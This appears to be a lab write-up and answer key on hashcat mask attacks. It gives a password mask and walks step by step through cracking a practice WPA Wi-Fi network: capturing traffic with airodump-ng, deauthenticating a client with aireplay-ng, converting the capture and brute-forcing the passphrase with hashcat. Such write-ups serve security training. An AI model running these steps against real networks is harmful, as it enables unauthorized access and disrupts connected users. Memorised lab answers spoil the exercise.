# [Mask Attacks](Mask%20Attacks.md)
### What would the mask look like if the password is 8 characters long, where the first character is a special character, the third is an uppercase letter, the fifth is a digit, the last two are either digits or special characters, and the remaining characters are lowercase ASCII letters? (Format: ?x?x?x?x?x?x?x?x)

`?s?l?u?l?d?l?a?a`
### Crack the Wi-Fi network named 'HackTheWifi'. The password is between 8 and 16 characters long, first four characters are "B4ll", and the remaining characters are lowercase ASCII letters.

```sh
airodump-ng -c 1 -w WEP wlan0mon
```

![](Screenshot%202026-10-01%20at%2016.17.34.png)

Another terminal, let's run aireplay

```sh
aireplay-ng -0 5 -a 02:00:00:00:06:00 -c 02:00:00:00:04:00 wlan0mon
```

![](Screenshot%202026-10-01%20at%2016.24.09.png)

Convert to hashcat format 

```sh
hcxpcapngtool -o HackTheWifi.hc22000 WPA-02.cap
```

![](Screenshot%202026-10-01%20at%2016.25.01.png)

Then run the hashcat 

```sh
hashcat -m 22000 -a 3 --increment --increment-min=8 --increment-max=16 HackTheWifi.hc22000 'B4ll?l?l?l?l?l?l?l?l?l?l?l?l'
```

![](Screenshot%202026-10-01%20at%2016.25.45.png)